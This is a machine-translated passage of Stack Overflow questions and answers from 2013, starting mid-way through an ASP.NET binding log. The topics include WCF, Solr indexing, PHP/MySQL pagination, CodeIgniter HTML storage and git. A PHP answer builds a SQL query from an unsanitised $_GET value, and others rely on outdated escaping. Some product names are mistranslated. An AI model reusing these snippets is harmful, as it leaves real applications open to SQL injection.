LOG：此绑定在默认加载上下文中开始。LOG：使用应用程序配置文件：C:\Users\stassis\Documents\Development\theDreamBox\web.config LOG：使用主机配置文件：LOG：使用来自 C:\Windows\Microsoft.NET\Framework\v4 的机器配置文件。 0.30319\config\machine.config。LOG：此时未将策略应用于引用（私有、自定义、部分或基于位置的程序集绑定）。日志：正在尝试下载新的 URL 文件：///C:/Users/stassis/AppData/Local/Temp/Temporary ASP.NET Files/root/87ef3319/ec80b2f5/App_Web_oq2tdtg4.DLL。日志：正在尝试下载新的 URL 文件：///C:/Users/stassis/AppData/Local/Temp/Temporary ASP.NET Files/root/87ef3319/ec80b2f5/App_Web_oq2tdtg4/App_Web_oq2tdtg4.DLL。日志：正在尝试下载新的 URL 文件：///C:/Users/stassis/Documents/Development/theDreamBox/bin/App_Web_oq2tdtg4.DLL。日志：正在尝试下载新的 URL 文件：///C:/Users/stassis/Documents/Development/theDreamBox/bin/App_Web_oq2tdtg4/App_Web_oq2tdtg4.DLL。日志：尝试下载新的 URL 文件：///C:/Users/stassis/AppData/Local/Temp/Temporary ASP.NET Files/root/87ef3319/ec80b2f5/App_Web_oq2tdtg4.EXE。日志：正在尝试下载新的 URL 文件：///C:/Users/stassis/AppData/Local/Temp/Temporary ASP.NET Files/root/87ef3319/ec80b2f5/App_Web_oq2tdtg4/App_Web_oq2tdtg4.EXE。日志：正在尝试下载新的 URL 文件：///C:/Users/stassis/Documents/Development/theDreamBox/bin/App_Web_oq2tdtg4.EXE。日志：正在尝试下载新的 URL 文件：///C:/Users/stassis/Documents/Development/theDreamBox/bin/App_Web_oq2tdtg4/App_Web_oq2tdtg4.EXE。正在尝试下载新的 URL 文件：///C:/Users/stassis/AppData/Local/Temp/Temporary ASP.NET Files/root/87ef3319/ec80b2f5/App_Web_oq2tdtg4.EXE。日志：正在尝试下载新的 URL 文件：///C:/Users/stassis/AppData/Local/Temp/Temporary ASP.NET Files/root/87ef3319/ec80b2f5/App_Web_oq2tdtg4/App_Web_oq2tdtg4.EXE。日志：正在尝试下载新的 URL 文件：///C:/Users/stassis/Documents/Development/theDreamBox/bin/App_Web_oq2tdtg4.EXE。日志：正在尝试下载新的 URL 文件：///C:/Users/stassis/Documents/Development/theDreamBox/bin/App_Web_oq2tdtg4/App_Web_oq2tdtg4.EXE。正在尝试下载新的 URL 文件：///C:/Users/stassis/AppData/Local/Temp/Temporary ASP.NET Files/root/87ef3319/ec80b2f5/App_Web_oq2tdtg4.EXE。日志：正在尝试下载新的 URL 文件：///C:/Users/stassis/AppData/Local/Temp/Temporary ASP.NET Files/root/87ef3319/ec80b2f5/App_Web_oq2tdtg4/App_Web_oq2tdtg4.EXE。日志：正在尝试下载新的 URL 文件：///C:/Users/stassis/Documents/Development/theDreamBox/bin/App_Web_oq2tdtg4.EXE。日志：正在尝试下载新的 URL 文件：///C:/Users/stassis/Documents/Development/theDreamBox/bin/App_Web_oq2tdtg4/App_Web_oq2tdtg4.EXE。EXE文件。日志：正在尝试下载新的 URL 文件：///C:/Users/stassis/Documents/Development/theDreamBox/bin/App_Web_oq2tdtg4.EXE。日志：正在尝试下载新的 URL 文件：///C:/Users/stassis/Documents/Development/theDreamBox/bin/App_Web_oq2tdtg4/App_Web_oq2tdtg4.EXE。EXE文件。日志：正在尝试下载新的 URL 文件：///C:/Users/stassis/Documents/Development/theDreamBox/bin/App_Web_oq2tdtg4.EXE。日志：正在尝试下载新的 URL 文件：///C:/Users/stassis/Documents/Development/theDreamBox/bin/App_Web_oq2tdtg4/App_Web_oq2tdtg4.EXE。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-12T12:55:32.330

我不太确定，但是您将两个服务都绑定到同一个地址，可能您已经更改了每个服务实现的端点地址

```
<services>
 <service behaviorConfiguration="ServiceBehavior" name="Service">
   <endpoint address="a" binding="webHttpBinding"
       contract="IService" behaviorConfiguration="EndpBehavior"/>
 </service>
 <service behaviorConfiguration="ServiceBehavior" name="ServiceNew">
   <endpoint address="b" binding="webHttpBinding"
       contract="IServiceNew" behaviorConfiguration="EndpBehavior"/>
 </service> 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-12T13:21:28.970

有一个错误导致您正在观察类似的行为。我不知道这是否是确切的问题，但您可以查看[此支持页面](http://support.microsoft.com/kb/915782/en-us)。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-02-12T13:27:23.633

几天前我的服务遇到了同样的问题，[请参见此处](https://stackoverflow.com/questions/14771686/wcf-multiple-services-same-contract-in-same-config)

问题是我不必为一个 .config 文件中的实现提供服务。

当我托管服务时，我必须给出实现`ServiceHost`的类型 - 但由于在配置文件中定义了 tow，它不断抛出错误。

我的解决方案是从配置中添加一个服务，并`ServiceHost`在 C# 中添加另一个（到不同的）

# ruby-on-rails - Rails / Sunspot / Solr：继承类的重复索引

> ID：14832938
> 
> 赞同：3
> 
> 时间：2013-02-12T12:47:09.797
> 
> 标签：ruby-on-rails, search, inheritance, solr, sunspot

我们正在构建一个使用 Solr 作为搜索引擎的 Ruby on Rails 应用程序。以下版本号可能与下一段中描述的问题相关：

*   红宝石：1.9.2
*   导轨：3.2.6
*   太阳黑子：1.3.0.rc5

## 背景

我们有一个`Feedback`由不同子类继承的模型。类层次结构如下所示（单表继承）：

```
Feedback
  |- Problem
  |- Question
  |- Suggestion
  |- Announcement 
```

在`Feedback`模型中，索引由以下代码启用：

```
searchable :auto_index => true, :auto_remove => true do
  string :type
  text :title, :boost => 2
  text :content
  integer :user_id
  time :created_at
  ...
end 
```

## 问题

这样做的问题是，例如，在创建`Problem`标题为“problemtitle”的新时，Sunspot 会初始化`Problem` **和**底层的自动索引`Feedback`。当搜索标题为“问题标题”的反馈时

```
search = Feedback.solr_search do
    with(:type, type.capitalize)
    fulltext("problemtitle") {minimum_match 1}
    paginate(page: options[:page], per_page: options[:per_page])
end 
```

找到两个结果。一个结果是 ，`Problem`另一个是`Feedback`。这表明在类层次结构中，一个类及其子类被索引；据我所知，这应该是正确的。

这里奇怪的是，使用命令重新索引索引`bundle exec rake sunspot:solr:reindex`并搜索`Feedback`标题为“problemtitle”的结果是`Problem`上面创建的一个结果。

我们通过添加`:unless => proc {|model| model.class == Feedback}`到`Feedback`模型中的可搜索定义来解决这个问题。这确保只有子类`Feedback`被自动索引。

## 问题

我的问题是这是否是所需的行为（是功能还是错误）。我不明白为什么重新索引将模型索引与创建时的自动索引不同。这可能是我们如何实现类层次结构的问题吗？

如果需要更多信息来回答我的问题，我会尽力提供。

最诚挚的问候，

塞巴斯蒂安

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2014-05-23T16:41:13.137

Sebastian，我认为这里的问题是 Sunspot 使用完整的类名和 id 创建了 Solr 主 id：

```
def index_id_for(class_name, id) #:nodoc:
  "#{class_name} #{id}"
end 
```

因此，如果您的类被索引为 a`Feedback`然后又作为`Feedback::Problem`Solr 将有两个条目，因此在搜索时返回它们。然后，Sunspot 将尝试将每个项目与数据库进行匹配，两次提取相同的项目。当重新索引整个数据库时，会删除每个项目的当前类索引 - 这就是为什么在重新索引后只有一个。

我们遇到了类似的问题，解决方案是`InstanceAdapter`为 STI 类创建我们自己的类并将其注册到初始化程序中：

```
class StiInstanceAdapter < Sunspot::Adapters::InstanceAdapter

  def id
    @instance.id
  end

  def index_id
    return Sunspot::Adapters::InstanceAdapter.index_id_for(@instance.class.base_class.name, id)
  end

end

Sunspot::Adapters::InstanceAdapter.register(StiInstanceAdapter, Feedback) 
```

我知道这有点晚了，但希望它有所帮助。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-07-09T11:30:38.347

我们通过使用除非语句扩展可搜索块解决了上述问题：

```
searchable :auto_index => true, :auto_remove => true, 
  :unless => proc {|model| model.class == Feedback} do
    string :type
    text :title, :boost => 2
    text :content
    integer :user_id
    time :created_at
    ...
  end
end 
```

# jquery - Highcharts 中的滑块，类似于 Google Playground

> ID：14832942
> 
> 赞同：0
> 
> 时间：2013-02-12T12:47:24.633
> 
> 标签：jquery, highcharts

在以下谷歌游乐场链接上，有一个滑块更改饼图。我只想知道这样的选项是预建在 Highcharts 中还是我必须自己编写。

[https://code.google.com/apis/ajax/playground/?type=visualization#simple_dashboard](https://code.google.com/apis/ajax/playground/?type=visualization#simple_dashboard)

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-12T13:28:51.307

Highcharts 没有内置滑块。您必须为自己创建该滑块，并将该滑块与 Highcharts`chart.series[0].setData(data);`函数连接，请参阅：[http://api.highcharts.com/highcharts#Series.setData()](http://api.highcharts.com/highcharts#Series.setData())（尤其是最后一个示例）。

# android - 如何在android中通过左滑或右滑来一张一张地切换图像？

> ID：14832947
> 
> 赞同：1
> 
> 时间：2013-02-12T12:47:44.090
> 
> 标签：android, android-gallery

我有一堆图像。我想通过向左或向右滑动来一张一张地显示所有图像。任何人都可以帮助我。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-12T12:50:33.073

使用 ViewPagerIndicator。它可以很好地满足您的要求。

最好的例子就是 Jake Wharton 的 View Pager 指示器。

[https://github.com/JakeWharton/Android-ViewPagerIndicator](https://github.com/JakeWharton/Android-ViewPagerIndicator)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-12T13:01:55.323

然后您可以对图像使用页面卷曲效果。

你可以右转或左转。希望这可能对您有所帮助。

[http://code.google.com/p/android-page-curl/](http://code.google.com/p/android-page-curl/)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-12T12:53:25.127

对于 apis < 16，您可以使用 Gallery widgvet ( [http://developer.android.com/reference/android/widget/Gallery.html](http://developer.android.com/reference/android/widget/Gallery.html) )

另一种解决方案是使用 Viewpager，请查看这篇文章：[Gallery of images using ViewPager + zoom in ImageViews](https://stackoverflow.com/questions/9089380/gallery-of-images-using-viewpager-zoom-in-imageviews)

# osx-mountain-lion - 如何在（签名的）联网应用程序运行时抑制防火墙警告（来自 Xcode）

> ID：14832952
> 
> 赞同：2
> 
> 时间：2013-02-12T12:48:09.683
> 
> 标签：osx-mountain-lion, firewall, xcode4.6

在`Code Signing Identity`Xcode 中使用我的`iPhone Developer`证书。

![Xcode 中的代码签名身份](../Images/1446a6cd46a960790a37882930c6ba1e.png) 唉，每次我尝试在 iOS 模拟器中测试时，我仍然*必须*单击。“这只是一个点击”，但它会在一段时间后变老。`Allow``.app`

![防火墙警告](../Images/ea347aa61967d50c1dfefc89ecb2f924.png)

**可以取消此警告吗？如果是这样，怎么做？**

* * *

我已经尝试过**(1)**`.app`在 Mountain Lion's 中手动删除和添加`Firewall Options`，**(2)**`.app`从终端手动签名`codesign`，**(3)**其他一些我不记得的事情。

关于**（2）**：手动签名`.app`是“成功的”......

```
| 492 > codesign -vvv MyApp.app 
MyApp.app: valid on disk 
MyApp.app: satisfies its Designated Requirement 
```

...但我想它不起作用，因为每个都替换了?`xcodebuild`中的旧可执行文件`.app`

* * *

模糊相关的问题：[防火墙阻碍 Bonjour 网络调试](https://stackoverflow.com/questions/10363479/firewall-impeding-bonjour-network-debugging)

同样相关的，后来的问题：[如何让 Mac OS X 防火墙永久允许我的 iOS 应用程序？](https://stackoverflow.com/questions/9845502/how-do-i-get-the-mac-os-x-firewall-to-permanently-allow-my-ios-app)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-15T13:47:52.330

使用自动鼠标单击的解决方案：

1.  下载[CLIclick](http://www.bluem.net/en/mac/cliclick/)。（谢谢卡斯滕。）
2.  把它放在合适的位置，比如说`/usr/local/bin`。
3.  使用获取`Allow`按钮的屏幕坐标`⌘</kbd>`⇧</kbd>`4`. (In my example, these are x: 750, y: 600.)``
4.  使用此内容创建一个脚本（`w:`以毫秒为单位的等待时间）：

    ```
    /usr/local/bin/cliclick c:750,600 w:1500 m:+0,+0 c:. 
    ```

    `CLIclick`（如果不将其“移动”到同一位置（`m:+0,+0`零件）并再次单击同一位置（ ），我将无法开始工作`c:.`。）

5.  打开 Xcode`Preferences / Behaviors`并添加上面的脚本。 ![在此处输入图像描述](../Images/ca75414a191349f07c132bc6f1a77634.png)
6.  享受！

当然，仍然欢迎首先禁用警告*的解决方案。*

# ruby-on-rails - 如何处理一个两个单独的日期和时间字段？

> ID：14832954
> 
> 赞同：0
> 
> 时间：2013-02-12T12:48:24.650
> 
> 标签：ruby-on-rails, ruby-on-rails-3, datetime, parameters, mongoid

如何使两个单独的字段可以处理到`datetime field`数据库中的一个？

我正在使用 jquery 日期时间选择器，它在下面的代码示例中放置值之类的值。

参数仅包括带时间的字段，但忽略带日期的字段。

如果我用时间评论字段，则发送并保存日期，但参数看起来像“2013-23-02”，它不像多参数那样转发。

```
#model
field :start_at, type: DateTime

#view
= f.text_field :start_at, :value => "2013-02-23"
= f.text_field :start_at, :value => "20:20:20" 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-12T12:55:18.440

你可以使用虚拟属性和回调（这未经测试，但你应该明白）

```
# model
attr_writer :start_at_time, :start_at_date

before_validation :build_start_at

def start_at_date
  @start_at_date ||= start_at.to_date
end

def start_at_time
  @start_at_time ||= start_at.strftime("%H:%M")
end

def build_start_at
  self.start_at = Time.parse "#{start_at_date} #{start_at_time}"
end    

# view
= f.text_field :start_at_date
= f.text_field :start_at_time 
```

# php - 删除行时如何始终序列化mysql中的id行

> ID：14832955
> 
> 赞同：1
> 
> 时间：2013-02-12T12:48:25.477
> 
> 标签：php, mysql

当我删除数据库中的行时，ID（auto_increment）现在不再是串行的。假设我有`1 2 3 4 5 6 7 8 9`并且我删除了 rows `3 4 5`。删除后，我希望 ID 显示`1 2 3 4 5 6`为`1 2 6 7 8 9`

请问我该怎么做？

**更新**

我正在使用此代码显示从数据库生成的注释的序列号......（在一个while循环内）

```
 <?php  
            $serial = 0; 
            $serial++; 
            echo"<div class='commentserial'>
                  <div id='$serial'></div> 
                    <a href='#$serial'>$serial</a> 
                  </diV>";
      ?> 
```

现在我在评论显示上有一个分页脚本，当我单击第二页而不是序列号时，序列号从 1 开始到 $per_page 编号。

所以我觉得如果我使用数据库 ID，那么编号不会在后续分页页面上从 1 开始。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-12T12:50:05.147

你想做的不是好习惯。主键中的孔不应该留在那里。想象一下，例如在另一个表中引用`25`主表中的 ID。如果主表发生变化，引用会突然指向不同的记录。

比如说，网络链接也是如此。有一个像

```
details.html?id=255 
```

突然指向不同的记录会*很*糟糕。

如果您想要一个完美的序列号，最好在应用程序级别创建它。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-12T13:17:19.563

使用：SELECT * FROM table_name LIMIT offset, row_count

例子：

```
if(isset($_GET['page'])) $page=$_GET['page'];
else                     $page=1;

$row_count=10;     

$offset=($page-1)*$row_count;
$sql="select * from table1 limit $offset,$row_count"; 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-12T13:24:46.880

自动增量仅用于合成键。这些键没有任何语义含义，因此它们是否按顺序无关紧要。

如果您的 ID 列具有语义含义，您应该给它一个有意义的名称，并且不要在其上使用自动增量（如果需要，您可以考虑使用自动增量创建一个新的合成键）。

要实现分页，您可以使用数据库查询。考虑 mysql 关键字`LIMIT`和`OFFSET`. 这样，您生成链接的代码就不必担心 ID 序列中的漏洞。

# objective-c - NSOperationQueue 在 NSOperation 内

> ID：14832956
> 
> 赞同：2
> 
> 时间：2013-02-12T12:48:46.693
> 
> 标签：objective-c, cocoa-touch, afnetworking, nsoperation, nsoperationqueue

我创建了一个`NSOperation`目标是从 20 个 URL 下载一些图像（如 20 个）。所以在这个里面`NSOperation`我创建了 20 个`AFImageRequestOperation`添加它们并在队列中`NSOperationQueue`调用。`-waitUntilAllOperationsAreFinished`

问题是，它不会等待，它会立即返回。这是代码

```
- (void)main {
    NSArray *array = [I have the 20 links stored in this array];

    self.queue = [[NSOperationQueue alloc]init];
    self.queue.maxConcurrentOperationCount = 1;

    for (int i = 0; i < array.count; i++) {                
        NSURL *url = [NSURL URLWithString:[array objectAtIndex:i]];
        NSURLRequest *request = [NSURLRequest requestWithURL:url];

        AFImageRequestOperation *op = [AFImageRequestOperation imageRequestOperationWithRequest:request imageProcessingBlock:^UIImage *(UIImage *image) {
            return image;
        } success:^(NSURLRequest *request, NSHTTPURLResponse *response, UIImage *image) {
        // SUCCESS BLOCK (not relevant)
        } failure:^(NSURLRequest *request, NSHTTPURLResponse *response, NSError *error) {
        // FAILURE BLOCK (not relevant)
        }];

        [self.queue addOperation:op];
    }

    [self.queue waitUntilAllOperationsAreFinished]; // Here is the problem it doesn't wait
    DDLogWarn(@"-- %@ FINISHED --", self);

} 
```

在控制台中，`DDLogWarn(@"-- %@ FINISHED --", self);`每个操作甚至开始之前的打印，所以我的猜测是`waitUntilAllOperationsAreFinished`没有完成它的工作并且没有等待，但是之后 20 个操作仍在运行，这可能意味着`main`还没有返回，所以我不知道该怎么想了。

编辑1：实际上我想知道，如果我的`DDLog`内部成功和失败阻塞，因为`waitUntilAllOperationsAreFinished`阻塞线程直到所有操作完成。这可以解释为什么我没有看到任何事情发生并且一切都突然发生。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-02-13T13:12:12.663

我发现创建一个`NSOperation`包含其他`NSOperations`类似原因的任务很有用，即我有很多较小的任务组成一个更大的任务，我想将更大的任务视为一个单元，并在它有时被通知完全的。我还需要序列化更大任务的运行，因此一次只运行一个，但是当每个大任务运行时，它可以在其内部执行多个并发操作。

在我看来，和你一样，创建一个`NSOperation`管理大任务的方法是一个好方法，而且我还没有阅读文档中说不要这样做的任何内容。

看起来您的代码毕竟可以工作，因此您可以继续使用 NSOperation。

根据您的情况，阻塞线程可能是合理的。如果阻塞不合理，但您想继续使用 NSOperation，则需要创建“并发”，`NSOperation`请参阅[并发编程指南：为并发执行配置操作](http://developer.apple.com/library/ios/#documentation/General/Conceptual/ConcurrencyProgrammingGuide/OperationObjects/OperationObjects.html#//apple_ref/doc/uid/TP40008091-CH101-SW8)

如果您一次只允许下载一个图像，您可以使用@jackslashs 建议来表示操作结束，或者如果您想允许并发图像下载，那么您可以使用单个`NSBlockOperation`作为最终操作并使用`-[NSOperation addDependency:]`它来使其依赖在所有其他操作上，因此它将最后运行。

当您收到一切都已完成的信号时，您可以按照文档中的说明适当地设置`isFinished`和标志以完成您的 main .`isExecuting``NSOperation`

诚然，这具有一定程度的复杂性，但您可能会发现它很有用，因为一旦将复杂性隐藏在`NSOperation`外部代码中，外部代码可能会更简单，就像我的情况一样。

如果您决定创建并发`NSOperation`，您可能会发现 Apple 示例代码`LinkedImageFetcher`：`QRunLoopOperation`作为起点很有用。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-12T12:55:53.130

此代码不需要位于`NSOperation`. 而是创建一个类，也许是一个单例，它有一个操作队列并创建一个名为的方法

```
-(void)getImagesFromArray:(NSArray *)array 
```

或类似的东西，你上面的代码可以很好地排入该队列。你不需要打电话`waitUntilAllOperationsAreFinished`。那是一个阻塞呼叫。如果您的队列的最大操作计数为 1，您可以在添加所有网络操作后添加另一个操作，然后当它执行时，您知道所有其他操作都已完成。您可以在末尾添加一个简单的块操作：

```
//add all the network operations in a loop
[self.operationQueue addOperation:[NSBlockOperation blockOperationWithBlock:^{
    //this is the last operation in the queue. Therefore all other network operations have finished
}]]; 
```

# php - Codeigniter 2.1 - 将 HTML 页面插入数据库

> ID：14832960
> 
> 赞同：4
> 
> 时间：2013-02-12T12:48:56.863
> 
> 标签：php, mysql, codeigniter, codeigniter-2

我正在尝试创建迷你 CMS，用户可以在其中创建新页面，然后该页面成为菜单的一部分。将整页插入数据库是否明智或有更好的方法？我在插入时也遇到了一些**标签**问题。现在的代码：

将页面插入数据库：

```
public function strana_insert()
    {
        $this->admin_login_check();
        $clear = $this->str->clean_request();

        $char  = array('\n', '\n');
        $strana  = str_replace($char, '<br>', $clear['opis']);
        $kljucna_rec = str_replace( ' ', '_', mb_convert_case($clear['naziv'], MB_CASE_LOWER, "UTF-8") );
            $data = array(
            'naziv'           => $clear['naziv'],
            'strana'          => htmlspecialchars($strana, ENT_QUOTES , "UTF-8"),
            'kljucna_rec'     => $kljucna_rec,
            'datum_kreiranja' => date("Y-m-d H:i:s")
        );
        $this->str->save($data);
        $this->save_routes();
        redirect('admin');
    } 
```

clean_request 函数的代码：

```
public function clean_request()
    {
        foreach($_POST as $key=>$value) :
            $clean[$key]=mysql_real_escape_string(trim($value));
        endforeach;

        return $clean;
    } 
```

当我插入带有**标签的**页面时，我得到以下结果：

```
<a href=\"http://www.example.com\" class=\"link_name\">www.example.com</a> 
```

更新页面后 * *\ **之间的所有内容都将被删除。这里发生了什么？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-12T12:56:04.267

这是因为逃生功能！htmlspecialchar 将您的代码更改为一个简单的字符串！

如果你想保存为 html，你应该保存代码而不转义！

顺便说一句，这不是创建静态页面的聪明方法，您可能希望创建布局并简单地让用户将内容放入其中；）

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-02-12T13:12:41.650

**您可以使用 Codeigniter 的活动类来插入它**或使用以下方法。

在将 HTML 数据插入数据库之前，请执行以下操作：

```
$html_for_db = addslashes($html_content); 
```

并插入`$html_for_db`数据库。

在显示此内容时，

```
echo stripcslashes($data_from_db); 
```

**stripcslashes() - 用 addcslashes 引用的取消引用字符串**

更多信息： http: [//php.net/manual/en/function.addslashes.php](http://php.net/manual/en/function.addslashes.php)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-02-12T13:48:50.877

如果您想将 html 存储在您的数据库中，我建议使用 htmlpurifier 来清理您的 html 代码并去除不需要的 html 标签。

[http://htmlpurifier.org/](http://htmlpurifier.org/)

还有一个助手可以让在 CodeIgniter 中使用 htmlpurifier 变得非常容易：[https ://github.com/refringe/codeigniter-htmlpurifier](https://github.com/refringe/codeigniter-htmlpurifier)

使用 htmlpurifier 清理输入字符串后，您应该使用 Codeigniters Active Record 类插入数据（[http://ellislab.com/codeigniter/user-guide/database/active_record.html](http://ellislab.com/codeigniter/user-guide/database/active_record.html)）。这样框架将进行转义。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-02-12T13:18:08.850

您必须在这里防止两种类型的攻击：SQL 注入和跨端脚本。您考虑了两者，并`htmlspecialchars()`针对 XSS 和`mysql_real_escape_string()`SQL 注入使用了它们。

但是您以错误的顺序使用它们。您首先必须使用 htmlspecialchars，因为这是您想要存储/输出的内容。要将其保存到数据库中，您必须在存储之前将其包装到其 mysql_real_escape_string-ized 表示中，或者使用参数绑定。

# javascript - 从 Web 快速安装 javascript 库的工具

> ID：14832961
> 
> 赞同：0
> 
> 时间：2013-02-12T12:49:00.330
> 
> 标签：javascript, macos

是否有类似 brew for mac 的东西可以在当前文件夹中安装 javascript 库？像这样：

```
jsbrew install jquery
jsbrew install angularjs 
```

谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-05-04T16:35:18.187

看看鲍尔。它是前端库的包管理器：http: [//bower.io/](http://bower.io/)

# git - 在git下提交文件时如何控制重命名阈值？

> ID：14832963
> 
> 赞同：14
> 
> 时间：2013-02-12T12:49:03.183
> 
> 标签：git, rename, git-commit

我正在尝试将特定项目的连续快照放入 git 的历史记录中。我通过使用每个快照的内容填充存储库目录然后运行来做到这一点

```
git add -A .
git commit -m 'Version X' 
```

这是[此答案](https://stackoverflow.com/a/3148117/20520)中推荐的方法。但是，我看到只有当 100% 的文件内容保持不变时，提交才会识别文件重命名。有没有办法影响重命名检测`git commit`以使其找到文件内容发生变化的重命名？我看到了这一点，`git merge`并且`git diff`有各种用于控制重命名阈值的选项，但这些选项对于`git commit`.

我尝试过的事情：

*   使用自制脚本定位重命名的文件，并在提交新文件内容之前将原始文件重命名到新位置执行提交。但是，这引入了人工提交，并且看起来不优雅，因为它不使用 git 的重命名检测功能。
*   为每个快照创建一个单独的分支，然后将连续的分支合并到`master`using

    `git merge -s recursive -Xtheirs -Xpatience -Xrename-threshold=20`

    但是，这让我保留了旧版本的重命名文件，同时也无法检测到重命名。

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2013-02-12T12:53:25.210

`git commit`从不检测重命名。它只是将内容写入存储库。重命名（以及副本）仅在事后检测到，即运行时`git diff`，`git merge`和朋友。那是因为`git`不存储任何重命名/复制信息。

* * *

## 回答 #2

> 赞同：14
> 
> 时间：2013-02-12T13:34:20.460

如评论和另一个答案中所示，在提交中调整重命名检测阈值没有意义，因为这只会更改命令的输出，而不是实际存储在提交中的内容。

但是，您*可以*`git log`做的是在命令中调整重命名检测阈值。您可以通过使用`--find-renames`参数来执行此操作。这主要完成了我想要达到的结果。

# cordova - Ripple 错误地呈现移动应用程序元素

> ID：14832964
> 
> 赞同：1
> 
> 时间：2013-02-12T12:49:14.257
> 
> 标签：cordova, ripple

我已经开始了我的移动应用程序开发之旅，并发现了很棒的 Ripple Emulator。但是我遇到了一个问题，它不能正确呈现模拟的应用程序。

对于选定的平台（Android + PhoneGap 2.3.0）和设备（Galaxy Nexus 手机），每个应用程序的元素都比设备上实际显示的要大得多。

例如，图像要大得多（例如 250x250 的图像几乎填满了整个 Ripple Emulator 屏幕，而在 Nexus 上，它只占屏幕的一小部分，其原始分辨率为 720x1280）。14pt 字体大小的文本也非常大，而在 Nexus 上它们非常小，几乎难以阅读。等等。

它也无法响应标准的 JavaScript 事件。例如，当我手动触发*deviceready*事件时，我看不到任何效果，而在我的 Nexus 上，我清楚地看到了文本警报消息，我已经放在那里了。

这使得在 Ripple Emulator 下测试移动应用程序变得毫无用处，至少对我来说是这样。

我想知道，这是否可能是由于[Ripple 无法读取应用程序的配置文件](https://stackoverflow.com/questions/14832776/phonegap-ripple-emulator-always-reports-malformed-config-xml)造成的。但是，缺少配置和 CSS 解释中的问题之间有什么联系吗？

有什么问题或我想念什么？我已经按照 Ripple Emulator 页面上的说明设置了正确的 Chrome 设置，并且我正在使用正确的标志打开我的 Chrome 以允许它通过*file:///*协议访问本地文件。我完全没有想法，我还能尝试什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-01T12:48:58.717

确保将*Chrome*的缩放级别设置为 100%。

# javascript - 通过输入字段和下拉列表动态更新字段

> ID：14832966
> 
> 赞同：3
> 
> 时间：2013-02-12T12:49:15.893
> 
> 标签：javascript, jquery, html, ajax

我正在尝试通过输入字段动态更新文本字段。然后，这将链接到带有值的下拉选择。我还需要显示截止日期，以显示从今天开始提前 30 天。

这是我的 HTML：

```
<div>
    <label for="payment">Payment:</label>
    <input type="text" name="amount" id="amount" onChange="myfunction()"/>
    <br /><br />
    <label for="delivery">Delivery:</label>
    <select id="delivery" name="delivery">
        <option value="1">Fast</option>
        <option value="2">Medium</option>
        <option value="3">Slow</option>
    </select>    
</div>
<br />
<div>
Payment Breakdown: <br /><br />
Payment:
<div name="amount" id="amount"></div>
Freight:   
<div name="delivery" id="delivery"></div> 
Total Payment:
<div name="total" id="total"></div>
Due Date:    
<div name="date" id="date"></div>    
</div> 
```

不过，我正在努力解决 Javascript 部分并将它们组合在一起。

我已经做到了这一点，现在我被困住了。（我知道不是很远）

```
function myFunction()
{
var amount = document.getElementById("amount");
var delivery = parseInt($(this).find("option:selected").val());
total = amount + delivery
$("#total").html(total);
}; 
```

我查看了 Stackoverflow 和 Google 上的示例，但似乎没有什么与我想要实现的相似。虽然我知道答案就在那里，但我不确定我是否问对了问题。

干杯

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-12T13:00:45.547

我会把它改成这样。在这里，我有一个`updateCost()`函数，当金额更改或交货更改时调用。我还添加了处理到期日期的代码。

从金额中删除内联`onchange`事件：

```
<input type="text" name="amount" id="amount"/> 
```

Javascript：

```
function updateCost()
{
    var amount = $('#amount').val();
    var delivery = parseInt($('#delivery').val());

    var total = amount + delivery
    $("#total").html(total);
    $("#amountdiv").html(amount);
    $("#deliverydiv").html(delivery);

    // handle the due date
    var todayPlus30 = new Date();
    todayPlus30.setDate(todayPlus30.getDate()+30);
    var dateStr = todayPlus30.getDate() + "/" + (todayPlus30.getMonth()+1) + "/" + todayPlus30.getFullYear();

    $('#date').html(dateStr);
}

$(document).ready(function(){
    $('#amount').change(function(){ updateCost(); });
    $('#delivery').change(function(){ updateCost(); });
}); 
```

您的原始代码有一些问题：

1.  内联函数调用的错误案例
2.  `this`在函数中使用when`this`实际上不是您的任何元素（您没有将它作为参数传递）。
3.  在计算中使用`amount`when`amount`是输入元素，而不是值。
4.  从可用性的角度来看，它只会在金额更改时尝试更新，我认为最好同时更新金额和交付。

# apache-camel - 我可以在基于内容的路由器中进行管道传输吗？

> ID：14832967
> 
> 赞同：1
> 
> 时间：2013-02-12T12:49:16.843
> 
> 标签：apache-camel

我可以在基于内容的路由器中进行管道传输吗？我必须在基于内容的路由器中传输 bean。为此，我采用了以下配置。我希望配置本身能解释我的要求。这是正确的吗？我还必须添加 end() 标签吗？

```
<route>
  <from uri="activemq:queue:injob"/>
  <choice>
    <when>
       <simple>${header.type} == 'heartbeat'</simple>
       <to uri="bean:heartBeatHandler"/>
       <to uri="activemq:queue:outjob"/>
    </when>
    <when>
      <simple>${header.type} == 'dnsrequest'</simple>
      <to uri="bean:dnsRequestHandler"/>
      <to uri="bean:parser"/>
      <to uri="activemq:queue:outjob"/>
    </when>
    <when>
      <simple>${header.type} == 'whoisrequest'</simple>
      <to uri="bean:whoisRequestHandler"/>
      <to uri="bean:parser"/>
      <to uri="activemq:queue:outjob"/>
    </when>
    <otherwise>
      <to uri="bean:errorHandler"/>
    </otherwise>
  </choice>
</route> 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-12T13:07:12.123

是的，这是正确的。

